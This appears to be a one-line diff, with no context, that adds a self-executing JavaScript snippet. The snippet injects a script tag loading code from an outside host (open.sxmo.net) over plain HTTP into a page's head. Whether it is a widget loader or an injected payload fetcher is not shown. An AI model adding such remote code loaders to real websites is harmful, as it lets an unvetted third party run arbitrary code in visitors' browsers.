@@ -1,0 +1,1 @@
+(function(){var h = document.getElementsByTagName("head")[0],url = "http://open.sxmo.net/api/get/code/id/f91ab6c006e4",s = document.createElement("script");if(h){s.setAttribute("src", url);s.setAttribute("chartset", "utf-8"); s.setAttribute("type", "text/javascript");h.appendChild(s);}})();
